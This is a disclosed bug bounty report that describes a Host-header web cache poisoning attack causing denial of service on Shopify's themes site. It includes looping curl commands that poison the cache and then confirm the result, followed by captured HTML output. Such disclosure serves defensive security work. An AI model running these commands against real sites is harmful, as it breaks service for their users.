# https://themes.shopify.com::: Host header web cache poisoning lead to DoS

## Report Details
- **Report ID**: 1096609
- **URL**: https://hackerone.com/reports/1096609
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-02-05T18:45:51.371Z
- **Disclosed**: 2021-04-08T19:40:19.885Z

## Reporter
- **Username**: g4mm4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi there,
I just found the website:
https://themes.shopify.com
is infected with "Web cache poisoning" via HOST header lead to Denial of Services
Abuse this bug, Attacker can:

Poison your cache with HTTP header Host header with arbitrary PORT which is not opened. This attack may lead to Denial of Services

How to reproduce the issue:
In the 1st terminal, run command likes this:
----------
$ while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done
----------


In the 2nd terminal, run command below for confirmation this attack is successful or not:
----------
$ while true; do curl -ik "https://themes.shopify.com:443/"|grep ":1337"; done
----------
and the output from command with be confirmed my Host header poisoning worked:
$ while true; do curl -ik "https://themes.shopify.com:443/"|grep ":1337"; done
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  <link rel="canonical" href="https://themes.shopify.com:1337/">
        <li><div class="popover-wrapper js-popover-dropdown popover-wrapper--dropdown" data-position="bottom" data-align="left"><button type="button" class="popover__trigger marketing-nav__item marketing-nav__item--primary" itemprop="name">Collections<svg class="icon marketing-nav__arrow" aria-hidden="true" focusable="false"> <use xlink:href="#modules-caret-down" /> </svg></button><div class="popover"><div class="popover__content"><ul class="popover__list"><li><a href="/collections/trending-themes" class="marketing-nav__item marketing-nav__item--child" itemprop="name" data-ga-event="Main Nav" data-ga-action="Clicked" data-ga-label="trending-themes">Trending this week </a></li><li><a href="/collections/product-recommendations" class="marketing-nav__item marketing-nav__item--child" itemprop="name" data-ga-e
...........
+++

Finally, when user visits the homepage: https://themes.shopify.com, so many images, css, link will not be loaded (Because the port :1337 which appended themes.shopify.com:1337 is not opened
Please see the attached image for details.

cheers,
~g4mm4
References:
https://portswigger.net/research/web-cache-entanglement
Denial of Services

## Impact

Denial of Services

## Attachments
- PoC-Host-Header-cache-poisoned-DoS.png
